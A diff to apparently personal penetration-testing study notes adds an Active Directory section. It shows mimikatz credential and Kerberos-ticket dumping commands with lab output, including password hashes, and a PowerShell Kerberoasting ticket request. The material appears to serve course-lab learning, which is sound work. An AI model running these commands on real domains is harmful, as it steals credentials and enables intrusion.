@@ -419,6 +419,162 @@ Address:  192.168.1.110
 
 ### Active Directory Authentication
 
+#### Cached Credential Storage and Retrieval
+
+on a domain workstation
+
+```
+C:\Tools\active_directory> mimikatz.exe
+
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 291668 (00000000:00047354)
+Session           : Interactive from 1
+User Name         : Offsec
+Domain            : CORP
+Logon Server      : DC01
+Logon Time        : 08/02/2018 14.23.26
+SID               : S-1-5-21-1602875587-2787523311-2599479668-1103
+        msv :
+         [00000003] Primary
+         \* Username : Offsec
+         \* Domain   : CORP
+         \* NTLM     : e2b475c11da2a0748290d87aa966c327
+         \* SHA1     : 8c77f430e4ab8acb10ead387d64011c76400d26e
+         \* DPAPI    : 162d313bede93b0a2e72a030ec9210f0
+        tspkg :
+        wdigest :
+         \* Username : Offsec
+         \* Domain   : CORP
+         \* Password : (null)
+        kerberos :
+         \* Username : Offsec
+         \* Domain   : CORP.COM
+         \* Password : (null)
+...
+```
+
+```
+mimikatz # sekurlsa::tickets
+
+Authentication Id : 0 ; 291668 (00000000:00047354)
+Session           : Interactive from 1
+User Name         : Offsec
+Domain            : CORP
+Logon Server      : DC01
+Logon Time        : 08/02/2018 14.23.26
+SID               : S-1-5-21-1602875587-2787523311-2599479668-1103
+
+ * Username : Offsec
+ * Domain   : CORP.COM
+ * Password : (null)
+
+Group 0 - Ticket Granting Service
+ [00000000]
+   Start/End/MaxRenew: 09/02/2018 14.41.47 ; 10/02/2018 00.41.47 ; 16/02/2018 14.41.47
+   Service Name (02) : cifs ; dc01 ; @ CORP.COM
+   Target Name  (02) : cifs ; dc01 ; @ CORP.COM
+   Client Name  (01) : Offsec ; @ CORP.COM
+   Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ;
+   Session Key       : 0x00000012 - aes256_hmac
+     d062a1b8c909544a7130652fd4bae4c04833c3324aa2eb1d051816a7090a0718
+   Ticket            : 0x00000012 - aes256_hmac       ; kvno = 3        [...]
+
+Group 1 - Client Ticket ?
+
+Group 2 - Ticket Granting Ticket
+ [00000000]
+   Start/End/MaxRenew: 09/02/2018 14.41.47 ; 10/02/2018 00.41.47 ; 16/02/2018 14.41.47
+   Service Name (02) : krbtgt ; CORP.COM ; @ CORP.COM
+   Target Name  (--) : @ CORP.COM
+   Client Name  (01) : Offsec ; @ CORP.COM ( $$Delegation Ticket$$ )
+   Flags 60a10000    : name_canonicalize ; pre_authent ; renewable ; forwarded ; forwa
+   Session Key       : 0x00000012 - aes256_hmac
+     3b0a49af17a1ada1dacf2e3b8964ad397d80270b71718cc567da4d4b2b6dc90d
+   Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
+ [00000001]
+   Start/End/MaxRenew: 09/02/2018 14.41.47 ; 10/02/2018 00.41.47 ; 16/02/2018 14.41.47
+   Service Name (02) : krbtgt ; CORP.COM ; @ CORP.COM
+   Target Name  (02) : krbtgt ; CORP.COM ; @ CORP.COM
+   Client Name  (01) : Offsec ; @ CORP.COM ( CORP.COM )
+   Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forward
+   Session Key       : 0x00000012 - aes256_hmac
+     8f6e96a7067a86d94af4e9f46e0e2abd067422fe7b1588db37c199f5691a749c
+   Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
+...
+```
+
+#### Service Account Attacks
+
+```
+Add-Type -AssemblyName System.IdentityModel
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'HTTP/CorpWebServer.corp.com'
+```
+
+```
+```
+
+{% tabs %}
+{% tab title="klist" %}
+```
+PS C:\Users\offsec.CORP> klist
+
+Current LogonId is 0:0x3dedf
+
+Cached Tickets: (4)
+
+#0>	Client: Offsec @ CORP.COM
+	Server: krbtgt/CORP.COM @ CORP.COM
+	KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+	Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicaliz
+	Start Time: 2/12/2018 10:17:53 (local)
+	End Time:   2/12/2018 20:17:53 (local)
+	Renew Time: 2/19/2018 10:17:53 (local)
+	Session Key Type: AES-256-CTS-HMAC-SHA1-96
+	Cache Flags: 0x1 -> PRIMARY 
+	Kdc Called: DC01.corp.com
+
+#1>	Client: Offsec @ CORP.COM
+	Server: HTTP/CorpWebServer.corp.com @ CORP.COM
+	KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
+	Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_cano
+	Start Time: 2/12/2018 10:18:31 (local)
+	End Time:   2/12/2018 20:17:53 (local)
+	Renew Time: 2/19/2018 10:17:53 (local)
+	Session Key Type: RSADSI RC4-HMAC(NT)
+	Cache Flags: 0 
+	Kdc Called: DC01.corp.com
+...
+```
+{% endtab %}
+
+{% tab title="mimikatz" %}
+
+
+```
+mimikatz # kerberos::list /export
+
+[00000000] - 0x00000012 - aes256_hmac
+   Start/End/MaxRenew: 12/02/2018 10.17.53 ; 12/02/2018 20.17.53 ; 19/02/2018 10.17.53
+   Server Name       : krbtgt/CORP.COM @ CORP.COM
+   Client Name       : Offsec @ CORP.COM
+   Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forward
+   \* Saved to file     : 0-40e10000-Offsec@krbtgt~CORP.COM-CORP.COM.kirbi
+
+[00000001] - 0x00000017 - rc4_hmac_nt
+   Start/End/MaxRenew: 12/02/2018 10.18.31 ; 12/02/2018 20.17.53 ; 19/02/2018 10.17.53
+   Server Name       : HTTP/CorpWebServer.corp.com @ CORP.COM
+   Client Name       : Offsec @ CORP.COM
+   Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ;
+   \* Saved to file     : 1-40a50000-offsec@HTTP~CorpWebServer.corp.com-CORP.COM.kirbi
+```
+{% endtab %}
+{% endtabs %}
+
+\
 \
 \
 \
@@ -459,7 +615,7 @@ Packets that have the _PSH_ and _ACK_ flags turned on.&#x20;
 * All packets sent and received after the initial 3-way handshake will have the _ACK_ flag set.&#x20;
 * The _PSH_ flag is used to enforce immediate delivery of a packet and is commonly used in interactive _Application Layer_ protocols to avoid buffering
 
-<figure><img src=".gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
 
 _ACK_ and _PSH_ are represented by the fourth and fifth bits of the 14th byte(\[13]), respectively
 
